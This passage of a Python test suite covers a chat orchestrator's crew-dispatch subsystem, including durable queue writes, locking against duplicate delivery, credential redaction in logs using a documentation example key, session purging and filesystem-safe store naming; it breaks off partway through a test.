        # parse, so its None alone cannot mean "never ran" — that would
        # re-dispatch a task which may already have mutated something.
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", return_value=None), \
                patch.object(crew_mod, "_agent_dir") as ad:
            ad.return_value.exists.return_value = True      # the run DOES exist
            assert orch._run_started("corrupt1") is True

    def test_a_positively_absent_run_dir_reopens(self) -> None:
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", return_value=None), \
                patch.object(crew_mod, "_agent_dir") as ad:
            ad.return_value.exists.return_value = False     # never dispatched
            assert orch._run_started("gone1") is False

    def test_the_marker_reaches_the_durable_log(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        # Chat history has TWO sources: the in-memory slot (which carried the
        # marker) and, after a restart, this log — whose append had no cls
        # parameter, so the marker survived a reload but not a restart.
        from kiro_crew.history import ConversationLog
        log = ConversationLog(tmp_path)
        log.append("dashboard:s1", "assistant", "an answer",
                   cls="msg msg-a crew-reply")
        rows = log.read_messages("dashboard:s1")
        assert any("crew-reply" in (r.get("cls") or "") for r in rows), \
            "the durable copy lost the marker"

    def test_an_unmarked_message_writes_no_cls_field(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        # Additive: existing callers and existing rows are unchanged.
        from kiro_crew.history import ConversationLog
        log = ConversationLog(tmp_path)
        log.append("dashboard:s1", "assistant", "plain")
        rows = log.read_messages("dashboard:s1")
        assert rows and "cls" not in rows[-1]


class TestColdStoreLoadsOffLoop:
    """Building a store is a mkdir plus three JSON parses, and the queue grows
    with the session — so a cold build on a busy slot must not sit on the loop."""

    @pytest.mark.asyncio
    async def test_a_cold_store_is_built_in_the_executor(self) -> None:
        seen: list[str] = []
        real_init = CrewStore.__init__

        def _tracking_init(self, slot_key):          # type: ignore[no-untyped-def]
            seen.append(threading.current_thread().name)
            real_init(self, slot_key)

        orch = _orch()
        with patch.object(CrewStore, "__init__", _tracking_init):
            st = await orch._store_async("s1")
        assert st is not None
        assert seen, "the store was never built"
        assert seen[0] != threading.main_thread().name, \
            "the cold build ran on the event loop's thread"

    @pytest.mark.asyncio
    async def test_a_cached_store_needs_no_executor_hop(self) -> None:
        orch = _orch()
        first = await orch._store_async("s1")
        with patch.object(CrewStore, "__init__", side_effect=AssertionError("rebuilt")):
            again = await orch._store_async("s1")
        assert again is first

    @pytest.mark.asyncio
    async def test_reconciliation_still_happens_on_a_cold_build(self) -> None:
        # Only the BUILD is offloaded; reconcile posts and schedules, so it must
        # still run — and on the loop.
        orch = _orch()
        with patch.object(orch, "_reconcile") as rec:
            await orch._store_async("s1")
        rec.assert_called_once()


class TestGptRoundSeven:
    """The four blocking findings from the review of b58ead343."""

    def test_the_live_frame_carries_the_crew_reply_marker(self) -> None:
        # The marker went into the PERSISTED cls so it would survive a reload —
        # but the ws frame omitted it, so it worked ONLY after a reload and a
        # live crew answer was still collapsed into "Worked through N steps".
        # The store reducer reads `cls` off the payload, so it must ride along.
        orch = _orch()
        slot = _slot()
        orch._post(slot, "an answer", kind="crew_result")
        frame = orch._state.broadcast_ws.call_args.args[1]
        assert "crew-reply" in frame.get("cls", ""), "live frame lost the marker"
        # And the persisted copy still carries it (both paths, one value).
        assert "crew-reply" in slot.append.call_args.args[2]

    def test_the_ack_frame_is_not_marked(self) -> None:
        orch = _orch()
        slot = _slot()
        orch._post(slot, "On it.", kind="crew")
        frame = orch._state.broadcast_ws.call_args.args[1]
        assert "crew-reply" not in frame.get("cls", "")

    @pytest.mark.asyncio
    async def test_an_unparseable_decision_is_redacted_before_logging(self, caplog) -> None:  # type: ignore[no-untyped-def]
        # The log is a SECOND egress for untrusted model text; `_post` being the
        # delivery chokepoint does not cover it. Assert on what actually reaches
        # the logger, not on the helper — the call site is what can regress.
        secret = "AKIAIOSFODNN7EXAMPLE"
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        st.add_msg("do the thing")

        async def _bad_json(*a, **kw):
            # Must contain braces so the extractor matches and json.loads is
            # what fails — brace-less text yields actions=[] with no log line.
            return "{broken json, credential: " + secret + "}"

        with caplog.at_level(logging.WARNING):
            with patch.object(crew_mod, "run_bg_oneliner", side_effect=_bad_json):
                await orch._decide_once(slot)
        assert caplog.text, "the parse failure must still be logged"
        assert secret not in caplog.text, "raw model output leaked into the log"

    def test_the_log_redactor_withholds_rather_than_leaks(self) -> None:
        out = CrewOrchestrator._safe_for_log("token: AKIAIOSFODNN7EXAMPLE")
        assert "AKIAIOSFODNN7EXAMPLE" not in out

    def test_redaction_failure_withholds_rather_than_leaks(self) -> None:
        with patch.object(crew_mod, "redact_credentials", side_effect=RuntimeError("boom")):
            out = CrewOrchestrator._safe_for_log("token: AKIAIOSFODNN7EXAMPLE")
        assert "AKIAIOSFODNN7EXAMPLE" not in out

    @pytest.mark.asyncio
    async def test_a_temporary_slot_does_not_leak_memory_into_subagents(self) -> None:
        # `blocks_reads` (temporary memory mode) blocks memory-context injection.
        # chat_runner passes it on the main path; crew dispatch must too, or a
        # temporary crew slot injects stored memory and lessons into every run.
        orch = _orch()
        slot = _slot()
        slot.blocks_reads = True
        st = orch._store("s1")
        e = st.add_msg("do the thing")
        orch._subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
        await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"], "title": "t"})
        kw = orch._subagents.spawn.call_args.kwargs
        assert kw["include_memory"] is False
        assert kw["include_lessons"] is False

    @pytest.mark.asyncio
    async def test_a_persistent_slot_still_gets_its_context(self) -> None:
        orch = _orch()
        slot = _slot()
        slot.blocks_reads = False
        st = orch._store("s1")
        e = st.add_msg("do the thing")
        orch._subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
        await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"], "title": "t"})
        kw = orch._subagents.spawn.call_args.kwargs
        assert kw["include_memory"] is True
        assert kw["include_lessons"] is True

    def test_resumption_does_not_block_its_caller(self) -> None:
        # The gateway calls this on the boot path, so it must schedule the
        # profile-sized filesystem work rather than perform it: doing the scan
        # inline delayed readiness and stalled every other loop activity.
        orch = _orch()
        with patch.object(orch, "_resume_all", new=AsyncMock()) as ra:
            with patch.object(crew_mod.asyncio, "get_running_loop") as grl:
                orch.resume_persisted_slots()
                grl.return_value.create_task.assert_called_once()
        assert not ra.await_count, "the work must be scheduled, not awaited inline"

    def test_resumption_without_a_loop_is_survivable(self) -> None:
        orch = _orch()
        with patch.object(crew_mod.asyncio, "get_running_loop", side_effect=RuntimeError):
            orch.resume_persisted_slots()      # must not raise


class TestRestartResumesWork:
    """Constructing the orchestrator is not resuming it."""

    @pytest.mark.asyncio
    async def test_a_pending_entry_gets_a_decision_pass(self) -> None:
        # The evidence of the bug was: ack, then silence forever. `_store` only
        # reconciles on first touch and nothing touched it until a NEW message
        # arrived, so the acknowledged request was never looked at again.
        st = CrewStore("s1")
        st.add_msg("do the thing")
        st.save()
        await st.wait_writes()

        orch = _orch()
        slot = _slot()
        orch._state.get_slot = MagicMock(return_value=slot)
        with patch.object(orch, "_decide", new=AsyncMock()) as decide:
            assert await orch._resume_all() >= 1
        decide.assert_awaited()

    @pytest.mark.asyncio
    async def test_a_persisted_forward_is_redelivered(self) -> None:
        st = CrewStore("s1")
        st.add_forward("a result nobody saw")
        st.save()
        await st.wait_writes()

        orch = _orch()
        slot = _slot()
        orch._state.get_slot = MagicMock(return_value=slot)
        with patch.object(orch, "_post", return_value=True) as post:
            await orch._resume_all()
        assert any("a result nobody saw" in c.args[1] for c in post.call_args_list)

    @pytest.mark.asyncio
    async def test_an_idle_slot_is_not_resumed(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("already handled")
        e["state"] = "done"
        st.save()
        await st.wait_writes()

        orch = _orch()
        orch._state.get_slot = MagicMock(return_value=_slot())
        with patch.object(orch, "_decide", new=AsyncMock()) as decide:
            assert await orch._resume_all() == 0
        decide.assert_not_awaited()


class TestDeliveryFailureKeepsTheResult:
    """A failed delivery must not consume the only durable copy."""

    @pytest.mark.asyncio
    async def test_forward_survives_a_refused_post(self) -> None:
        # `_post` refuses to deliver when redaction fails, and used to do so
        # silently — the caller cleared the persisted forward anyway and the
        # completed result was gone for good.
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_post", return_value=False):
            await orch._queue_forward(slot, "result body")
        await orch._store("s1").wait_writes()      # reads below are ON-DISK
        assert [f["body"] for f in CrewStore("s1").forwards] == ["result body"]

    @pytest.mark.asyncio
    async def test_a_successful_post_still_clears(self) -> None:
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_post", return_value=True):
            await orch._queue_forward(slot, "result body")
        await orch._store("s1").wait_writes()
        assert CrewStore("s1").forwards == []

    @pytest.mark.asyncio
    async def test_drain_keeps_what_it_could_not_deliver(self) -> None:
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        st.add_forward("first")
        st.add_forward("second")
        # First delivers, second refuses: exactly one must remain. The drain now
        # clears only after the DURABLE transcript append lands, so stub that.
        with patch.object(orch, "_post_durable", new=AsyncMock(side_effect=[True, False])):
            await orch._drain_forwards(slot)
        assert [f["body"] for f in orch._store("s1").forwards] == ["second"]


class TestWriteBarrier:
    """`wait_writes` is the durability barrier — it must not miss a failure."""

    @pytest.mark.asyncio
    async def test_a_fast_write_failure_is_still_raised(self) -> None:
        # The barrier used to discard futures via a done-callback, so a write
        # that failed FAST vanished from the set before `wait_writes` snapshotted
        # it and the barrier reported success for a write that never landed.
        st = CrewStore("s1")
        st.add_msg("something to persist")
        with patch.object(Path, "write_text", side_effect=OSError("disk full")):
            st.save()
            # Let the executor finish BEFORE the barrier looks — this ordering is
            # the whole bug: a done-callback would already have dropped it.
            await asyncio.sleep(0.1)
            with pytest.raises(OSError):
                await st.wait_writes()

    @pytest.mark.asyncio
    async def test_a_successful_write_is_reaped(self) -> None:
        st = CrewStore("s1")
        st.save()
        await st.wait_writes()
        st.save()
        await st.wait_writes()            # must not re-raise or hang
        assert True


class TestGptRoundFive:
    """The five blocking findings from the review of 302cc7d91."""

    @pytest.mark.asyncio
    async def test_an_ask_entry_counts_as_live_work(self) -> None:
        # An entry waiting on the user's clarification is unfinished work. If the
        # mode can switch out from under it, the original request is abandoned
        # with no trace of why nothing ever happened.
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("do the ambiguous thing")
        e["state"] = "ask"
        st.save()
        assert await orch.has_live_work("s1") is True

    @pytest.mark.asyncio
    async def test_concurrent_ingress_keeps_the_users_order(self) -> None:
        """Ingress is ONE ordered step per slot: append, make durable, show.

        Two simultaneous POSTs each awaited only their own write, so when the later
        one landed first its echo and ack posted first and the two requests
        interleaved in the transcript. Asserted as CONTENTION, because racing two
        coroutines is not proof: without the lock the outcome depends on scheduling
        and happens to come out right often enough to pass.

        The guarantee is mutual exclusion, not "the order the user sent" -- for two
        genuinely simultaneous POSTs the server has no fact about which came first.
        The lock is taken before any await so that arrival order is what reaches it
        (asyncio.Lock is FIFO among waiters).
        """
        orch = _orch()
        slot = _slot()
        posted: list[str] = []

        async def _record(_slot, content, kind="crew"):  # type: ignore[no-untyped-def]
            posted.append(content)
            return True

        lock = orch._ingest_locks.setdefault("s1", asyncio.Lock())
        await lock.acquire()            # stand in for an ingress in progress
        with patch.object(orch, "_post_durable", new=_record), \
                patch.object(orch, "_decide", new=AsyncMock()):
            second = asyncio.create_task(orch.ingest(slot, "second request"))
            await asyncio.sleep(0.05)
            assert posted == [], "a second POST was echoed while the first held the lock"
            lock.release()
            await second
        assert posted, "the second request never surfaced after the lock freed"

    @pytest.mark.asyncio
    async def test_no_dispatch_once_teardown_has_started(self) -> None:
        """`cancel_all()` sets the flag and then reaps. A decision pass scheduled
        just before it -- the persisted-resume scan fires several, untracked -- would
        otherwise spawn a NEW subagent after teardown finished counting.

        Asserted on `_decide_once`, not on `spawn`: with a mocked session the
        decision pass cannot produce any action, so `spawn` is never called either
        way and an assertion on it would pass with the guard deleted.
        """
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        st.add_msg("please do this")
        orch._subagents._shutting_down = True

        with patch.object(orch, "_decide_once", new=AsyncMock()) as once:
            await orch._decide(slot)
        assert once.await_count == 0, "a decision pass ran during teardown"

        # A truthy-but-not-True attribute (a MagicMock's auto-created one) must NOT
        # mute a healthy gateway, or every test double would silently disable crew.
        orch._subagents._shutting_down = MagicMock()
        assert orch._teardown_started() is False

    @pytest.mark.asyncio
    async def test_a_live_forward_is_not_also_posted_by_the_drain(self) -> None:
        """Live delivery must be mutually exclusive with the recovery drain.

        The drain snapshots the pending list; the live path used to append outside
        that lock, so a forward added mid-drain was delivered by both and the
        transcript showed the same result twice. Asserted as CONTENTION rather than
        by racing two coroutines: gather alone does not reliably interleave them
        (the live path awaits its store build first, so the drain can read an empty
        list and the duplicate never appears), and a test that passes because the
        race did not happen proves nothing.
        """
        orch = _orch()
        slot = _slot()
        posted: list[str] = []

        async def _record(_slot, content, kind="crew"):  # type: ignore[no-untyped-def]
            posted.append(content)
            return True

        lock = orch._drain_locks.setdefault("s1", asyncio.Lock())
        await lock.acquire()            # stand in for a drain in progress
        with patch.object(orch, "_post_durable", new=_record):
            live = asyncio.create_task(orch._queue_forward(slot, "the answer"))
            await asyncio.sleep(0.05)
            assert posted == [], "live delivery ran while the drain held the lock"
            lock.release()
            await live
        assert posted == ["the answer"]
        assert orch._store("s1").forwards == []

    @pytest.mark.asyncio
    async def test_an_undelivered_forward_counts_as_live_work(self) -> None:
        """A persisted forward is undelivered WORK, not a finished record.

        A subagent that completes with the tab closed writes its result here
        instead of posting it, and the ONLY thing that flushes it is a later crew
        ingest. So a slot that resumed and switched modes before sending again left
        the answer on disk with no reader -- regular chat has no forward-draining
        step, and the user never learns the request finished.
        """
        orch = _orch()
        st = orch._store("s1")
        done = st.add_msg("finished while the tab was closed")
        done["state"] = "done"        # nothing in the QUEUE is live any more
        st.add_forward("Here is the answer you never saw.")
        await CrewStore.wait_for(st.save())
        assert await orch.has_live_work("s1") is True, (
            "the mode switch would have discarded an undelivered result"
        )
        # And it stops being live once the forward is delivered and cleared.
        st.remove_forwards({f["fid"] for f in st.forwards})
        await CrewStore.wait_for(st.save())
        assert await orch.has_live_work("s1") is False

    @pytest.mark.asyncio
    async def test_a_permanent_delete_cancels_and_purges_crew(self) -> None:
        """Crew persists independently of the transcript, so deleting a
        conversation left its durable queue -- the user's own request texts -- on
        disk and its dispatched subagents still running. Cancel BEFORE forgetting:
        the reverse order leaves a live subagent writing into a store nobody
        watches."""
        subagents = MagicMock()
        cancelled: list[str] = []
        subagents.cancel = AsyncMock(side_effect=lambda rid: cancelled.append(rid))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        st.add_msg("something private")
        await CrewStore.wait_for(st.save())
        store_dir = st.dir
        assert (store_dir / "queue.json").exists()
        orch._owned["rA"] = "s1"
        orch._owned["rOther"] = "s2"      # another slot's run must survive

        await orch.purge_slot("s1")

        assert cancelled == ["rA"], cancelled
        assert not store_dir.exists(), "the deleted session's requests survived on disk"
        assert orch._owned == {"rOther": "s2"}
        # Idempotent: a second delete (or a slot that never had a store) is a no-op.
        await orch.purge_slot("s1")
        await orch.purge_slot("never-existed")

    @pytest.mark.asyncio
    async def test_a_purge_cancels_a_claimed_but_unowned_dispatch(self) -> None:
        """`_owned` is only populated once a dispatch RETURNS.

        A spawn sitting behind the stagger is claimed and durable but not yet
        owned, so a purge that consulted only `_owned` would leave it to start
        after the deletion and execute tools against a conversation that is gone.
        The dispatch id is in the store for exactly this reason.
        """
        subagents = MagicMock()
        cancelled: list[str] = []
        subagents.cancel = AsyncMock(side_effect=lambda rid: cancelled.append(rid))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        inflight = st.add_msg("dispatched, not yet running")
        inflight["state"] = "claimed"
        inflight["dispatch_id"] = "d-inflight"
        settled = st.add_msg("long finished")
        settled["state"] = "done"
        settled["dispatch_id"] = "d-done"
        await CrewStore.wait_for(st.save())

        await orch.purge_slot("s1")

        assert "d-inflight" in cancelled, "a claimed dispatch outlived the deletion"
        assert "d-done" not in cancelled, "a settled entry must not be re-cancelled"

    @pytest.mark.asyncio
    async def test_a_purge_does_no_store_io_on_the_loop(self) -> None:
        """Reading an UNCACHED store is a mkdir plus three JSON parses, so doing it
        inline froze chats and heartbeats for as long as the filesystem took. And a
        slot that never ran crew work must not get a directory created just to
        delete it."""
        subagents = MagicMock()
        cancelled: list[str] = []
        subagents.cancel = AsyncMock(side_effect=lambda rid: cancelled.append(rid))
        orch = _orch(subagents=subagents)
        st = orch._store("cold")
        e = st.add_msg("dispatched before the tab closed")
        e["state"] = "claimed"
        e["dispatch_id"] = "d-cold"
        await CrewStore.wait_for(st.save())
        orch._stores.pop("cold", None)   # uncached: what a delete-after-restart hits

        await orch.purge_slot("cold")
        assert "d-cold" in cancelled, "an uncached store's in-flight dispatch was missed"

    def test_purge_slot_builds_no_store_inline(self) -> None:
        """Structural: the blocking build must sit in the executor helper, not in
        the coroutine. A behavioural test cannot tell the two apart -- both end up
        calling CrewStore -- so the check is on where the call is written. Named
        specifically: `purge_slot` also offloads its rmtree, so merely looking for
        `run_in_executor` would pass even with the probe called inline.
        """
        src = Path(crew_mod.__file__).read_text(encoding="utf-8")
        body = src.split("async def purge_slot")[1].split("\n    async def ")[0]
        code = "\n".join(
            ln for ln in body.splitlines() if not ln.lstrip().startswith("#")
        )
        assert "CrewStore(" not in code, "purge builds a store on the event loop"
        assert "run_in_executor(None, _purge_probe" in code, (
            "the probe is not offloaded to the executor"
        )

    def test_purge_probe_does_not_create_a_store(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        """A key with no store on disk must come back empty WITHOUT a mkdir.

        Asserted on the helper, not through `purge_slot`: the purge deletes the
        directory immediately afterwards, so a create-then-delete is invisible from
        the outside and a test that only checked `exists()` at the end passed either
        way.
        """
        ids, probed = crew_mod._purge_probe("no-store-here")
        assert ids == []
        assert not probed.exists(), "the probe created the store it was asked about"
        assert probed.name.startswith("no-store-here-"), probed.name

    @pytest.mark.asyncio
    async def test_a_purge_quiesces_an_in_flight_decision(self) -> None:
        """A cancel cannot reach work that has not been dispatched yet.

        A decision pass can be awaiting between its snapshot and a dispatch when
        the delete lands, so the pass itself must refuse rather than spawn into a
        deleted conversation.
        """
        orch = _orch()
        slot = SimpleNamespace(key="s1", project="", agent="", blocks_reads=False)
        st = orch._store("s1")
        e = st.add_msg("about to be dispatched")

        await orch.purge_slot("s1")

        await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"]})
        await orch._decide(slot)
        assert orch._subagents.spawn.call_count == 0, "spawned into a deleted conversation"
        assert orch._subagents.continue_conversation.call_count == 0, (
            "continued a deleted conversation"
        )

    @pytest.mark.asyncio
    async def test_a_reused_slot_name_is_not_muted_forever(self) -> None:
        """The quiesce marker must be liftable, or it is worse than the bug it fixes.

        Delete a session, then create a new one under the same explicit name: the
        marker survived, so ingress kept persisting and acknowledging requests while
        every decision pass returned without dispatching — a silently mute slot.
        A fresh request is what lifts it; store creation must NOT, since the stale
        pass creates a store itself and would use that to unmute.
        """
        orch = _orch()
        await orch.purge_slot("s1")
        assert "s1" in orch._purged
        # The stale pass's own store touch must not revive the key.
        await orch._store_async("s1")
        assert "s1" in orch._purged, "a stale decision pass unmuted its own slot"

        slot = _slot()
        with patch.object(orch, "_post"), \
                patch.object(orch, "_decide", new=AsyncMock()), \
                patch.object(orch, "_post_durable", new=AsyncMock(return_value=True)):
            await orch.ingest(slot, "a brand new request")
        assert "s1" not in orch._purged, "the recreated slot stayed permanently mute"

    @pytest.mark.asyncio
    async def test_an_unrelated_store_write_failure_does_not_strand_a_request(self) -> None:
        """The dispatch barrier owes durability for the QUEUE entry only.

        `save()` writes three files and the barrier propagated the first failure, so
        a topics.json error unrelated to this dispatch aborted it with the entry
        left `claimed` — the request never ran and the topic stayed busy until a
        restart. The queue entry is the recovery record; it is what must land.
        """
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("do the thing")
        real_save = CrewStore._save

        def _fail_topics(self, name, payload):  # type: ignore[no-untyped-def]
            if name == "topics.json":
                fut = asyncio.get_running_loop().create_future()
                fut.set_exception(OSError("topics.json is on a full disk"))
                # Registered exactly as `_save` does. A fake that skipped this was
                # invisible to the barrier, so the test passed with or without the
                # fix -- the failing write has to be IN the pending set to be awaited.
                self._pending_writes.add(fut)
                return fut
            return real_save(self, name, payload)

        slot = _slot()
        with patch.object(CrewStore, "_save", _fail_topics):
            await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"]})
        assert orch._subagents.spawn.called, (
            "an unrelated file's write failure aborted the dispatch"
        )
        assert e["state"] != "claimed", f"request stranded as {e['state']}"
        # Retrieve the deliberately-failed write so it does not warn at GC.
        await asyncio.gather(*list(st._pending_writes), return_exceptions=True)
        st._pending_writes.clear()

    def test_the_gateway_boot_path_does_not_import_crew(self) -> None:
        """Crew is dashboard-only, so `--no-dashboard` must not pay for it.

        Every module-level `from kiro_crew.crew_chat import ...` this branch added
        sat on the gateway's import graph (gateway -> kiro_crew.dashboard ->
        chat_folders / chat_handlers / handlers.sessions), so importing the gateway
        dragged the subsystem in before the API was ready to serve. Measured cost is
        one module -- the point is the repo's boot-path rule, which admits no new
        work there at all, not the size of the win.
        """
        probe = (
            "import sys, kiro_crew.slack.gateway as g;"
            "print(g.__file__);"
            "print('kiro_crew.crew_chat' in sys.modules)"
        )
        src = Path(crew_mod.__file__).parents[1]
        env = {**os.environ, "PYTHONPATH": str(src)}
        out = subprocess.run(
            [sys.executable, "-c", probe], capture_output=True, text=True, env=env,
        )
        assert out.returncode == 0, out.stderr[-600:]
        loaded, imported = out.stdout.strip().splitlines()[-2:]
        # Guard the guard: an installed copy in site-packages would answer for a
        # tree nobody edited, and this ratchet would pass no matter what the branch
        # did. Pin the module the subprocess actually loaded to the tree under test.
        assert loaded.startswith(str(src)), f"probed the wrong tree: {loaded}"
        assert imported == "False", (
            "importing the gateway pulled in crew_chat; a module-level import drifted back"
        )

    @pytest.mark.asyncio
    async def test_a_failed_queue_write_reopens_the_entry(self) -> None:
        """The pass ends with a full save, so a `claimed` left in memory after a
        FAILED barrier is persisted as a dispatch that never happened -- and nothing
        can adopt it, because no run carries that id. The rollback window closes at
        `spawn()`: after that, reopening would re-execute running work.
        """
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("do the thing")
        real_save = CrewStore._save

        def _fail_queue(self, name, payload):  # type: ignore[no-untyped-def]
            if name == "queue.json":
                fut = asyncio.get_running_loop().create_future()
                fut.set_exception(OSError("queue.json is on a full disk"))
                self._pending_writes.add(fut)
                return fut
            return real_save(self, name, payload)

        slot = _slot()
        with patch.object(CrewStore, "_save", _fail_queue):
            with pytest.raises(OSError):
                await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"]})
        assert not orch._subagents.spawn.called, "premise: the spawn never happened"
        assert e["state"] == "pending", f"a dispatch that never ran persists as {e['state']}"
        assert "dispatch_id" not in e, "an unmatched dispatch id survived the rollback"
        await asyncio.gather(*list(st._pending_writes), return_exceptions=True)
        st._pending_writes.clear()

    @pytest.mark.asyncio
    async def test_a_failed_steer_barrier_reopens_the_entry(self) -> None:
        """`steering` is EXCLUDED from future decisions, so persisting it for a
        steer that never happened is worse than persisting `claimed`: the entry is
        neither dispatched nor reconsidered, and the request sits forever."""
        orch = _orch()
        st = orch._store("s1")
        t = st.add_topic("tp1", "r1", "in flight", "m0")
        t["status"] = "running"
        t["active_run_id"] = "r1"
        e = st.add_msg("actually, do it differently")
        real_save = CrewStore._save

        def _fail_queue(self, name, payload):  # type: ignore[no-untyped-def]
            if name == "queue.json":
                fut = asyncio.get_running_loop().create_future()
                fut.set_exception(OSError("queue.json is on a full disk"))
                self._pending_writes.add(fut)
                return fut
            return real_save(self, name, payload)

        slot = _slot()
        with patch.object(CrewStore, "_save", _fail_queue):
            with pytest.raises(OSError):
                await orch._apply(slot, st, {
                    "do": "steer", "msg_id": e["msg_id"], "topic_id": "tp1",
                })
        assert not orch._subagents.steer_run.called, "premise: the steer never happened"
        assert e["state"] == "pending", f"a steer that never ran persists as {e['state']}"
        assert "run_id" not in e
        await asyncio.gather(*list(st._pending_writes), return_exceptions=True)
        st._pending_writes.clear()

    @pytest.mark.asyncio
    async def test_a_truncated_result_still_yields_its_summary(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        """The summary marker sits at the END of a result, so a head-capped
        completion event is exactly the case where it is missing — and the
        fallback then forwards the LEADING prose as the answer. When the manager
        says it truncated, the full text is on disk; read that."""
        orch = _orch()
        slot = _slot()
        orch._state.get_slot = MagicMock(return_value=slot)
        st = orch._store("s1")
        e = st.add_msg("do the long thing")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "running"
        e["state"] = "accepted"
        e["run_id"] = "r1"
        await CrewStore.wait_for(st.save())

        full = tmp_path / "result.txt"
        full.write_text(
            "chatter " * 500 + "<<<SUMMARY the answer you actually wanted >>>",
            encoding="utf-8",
        )
        info = _spawn_info("r1", done=True, result="chatter " * 50)  # head-capped
        info.result_truncated = True
        info.result_path = str(full)
        orch._owned["r1"] = "s1"
        posted: list[str] = []
        with patch.object(orch, "_post",
                          side_effect=lambda _s, body, **k: posted.append(body) or True):
            await orch.on_subagent_done(info)
        assert any("the answer you actually wanted" in p for p in posted), posted
        assert not any(p.startswith("chatter chatter") for p in posted), \
            "forwarded the leading prose instead of the summary"

    @pytest.mark.asyncio
    async def test_case_distinct_slots_do_not_share_a_store(self) -> None:
        """macOS and Windows are case-insensitive by default, so a fold that
        preserves case maps `Foo` and `foo` onto ONE directory — two live slots
        sharing a queue, each routing the other's requests. The digest suffix
        keeps them apart on every filesystem."""
        a, b = CrewStore("Foo"), CrewStore("foo")
        assert a.dir != b.dir
        # Case-insensitively distinct too, which is the property that matters:
        # equal-ignoring-case names would still collide on such a filesystem.
        assert a.dir.name.lower() != b.dir.name.lower()
        a.add_msg("for Foo")
        b.add_msg("for foo")
        # `add_msg` SCHEDULES its write off-loop, so reading a fresh store
        # straight after is a race — it passed locally and lost in CI. Await the
        # writes by name before asserting on what landed.
        await CrewStore.wait_for(a.save() + b.save())
        assert [e["text"] for e in CrewStore("Foo").queue] == ["for Foo"]
        assert [e["text"] for e in CrewStore("foo").queue] == ["for foo"]
        # The name is a fold + digest and cannot be decoded, so the exact key is
        # recorded for restart reconciliation to read back.
        assert (a.dir / "slot_key").read_text(encoding="utf-8") == "Foo"
        assert CrewOrchestrator._list_store_dirs() == sorted(["Foo", "foo"])

    @pytest.mark.asyncio
    async def test_an_overlong_slot_name_still_gets_a_store(self) -> None:
        """The readable half is one char per input char, so an uncapped fold put
        the directory name past the 255-char per-component limit and `mkdir`
        raised ENAMETOOLONG — reached from a slot name, so the ingress answered
        500 rather than accepting the request."""
        long_key = "s" * 300
        st = CrewStore(long_key)
        assert len(st.dir.name) <= 255, st.dir.name
        assert st.dir.is_dir(), "an overlong slot name could not be stored at all"
        st.add_msg("survived a very long name")
        await CrewStore.wait_for(st.save())
        assert [e["text"] for e in CrewStore(long_key).queue] == ["survived a very long name"]
        # Truncation must not merge two long keys that share a prefix: the digest
        # is taken over the FULL key, not the surviving remnant.
        other = CrewStore("s" * 300 + "-different-tail")
        assert other.dir != st.dir
        # The exact key is still recoverable even though the name cannot hold it.
        assert (st.dir / "slot_key").read_text(encoding="utf-8") == long_key

    @pytest.mark.asyncio
    async def test_a_store_file_of_the_wrong_shape_is_not_treated_as_empty(self) -> None:
        """Round 20 made an UNREADABLE file fatal but left valid JSON of the
        wrong shape returning [] — the same silent erase one branch over, since
        the next save() writes that emptiness back over the real file."""
        st = CrewStore("s1")
        st.add_msg("do not lose me")
        # Await the scheduled write before clobbering the file: otherwise it can
        # land AFTER the overwrite and restore a valid list, and the test passes
        # for the wrong reason.
        await CrewStore.wait_for(st.save())
        (st.dir / "queue.json").write_text('{"queue": []}', encoding="utf-8")
        with pytest.raises(RuntimeError, match="not a JSON list"):
            CrewStore("s1")
        # The refusal is the point: the bytes are still there to salvage.
        assert (st.dir / "queue.json").read_text(encoding="utf-8") == '{"queue": []}'

    @pytest.mark.asyncio
    async def test_dispatch_runs_in_the_slots_own_project(self) -> None:
        """A crew subagent EDITS FILES, so the project it launches in is not
        cosmetic. The slot's field is `project`; reading `cwd` (which no chat slot
        has) answered "" every time, so every crew subagent ran in the POOL
        project and relative edits landed in someone else's tree."""
        subagents = MagicMock()
        seen: list[str] = []
        subagents.spawn = MagicMock(
            side_effect=lambda *a, **k: seen.append(k.get("cwd")) or _spawn_info("r1"))
        orch = _orch(subagents=subagents)
        slot = _slot()
        slot.project = "/work/project-b"
        st = orch._store("s1")
        e = st.add_msg("edit the config")
        warmed: list[str] = []
        with patch("kiro_crew.crew_chat.warm_project_agents_for_spawn",
                   new=AsyncMock(side_effect=lambda _s, cwd: warmed.append(cwd))), \
             patch.object(orch, "_post"):
            await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"],
                                         "title": "edit the config"})
        assert seen == ["/work/project-b"], "spawn did not carry the slot's project"
        # The warm must validate the SAME directory the spawn will use, or it
        # warms one project's agent cache and launches in another.
        assert warmed == ["/work/project-b"]

    @pytest.mark.asyncio
    async def test_an_app_owned_session_is_refused_with_a_code(self) -> None:
        """Crew declines app-owned sessions. Returning nothing let `api_chat`
        answer 200, so a programmatic caller was told its message was accepted
        for work that would never run — the transcript note it posts is not
        visible to an API caller."""
        orch = _orch()
        slot = _slot()
        slot._app = "some-app"
        with patch.object(orch, "_post") as post, \
             patch.object(orch, "_decide", new=AsyncMock()) as decide:
            refusal = await orch.ingest(slot, "do thing A")
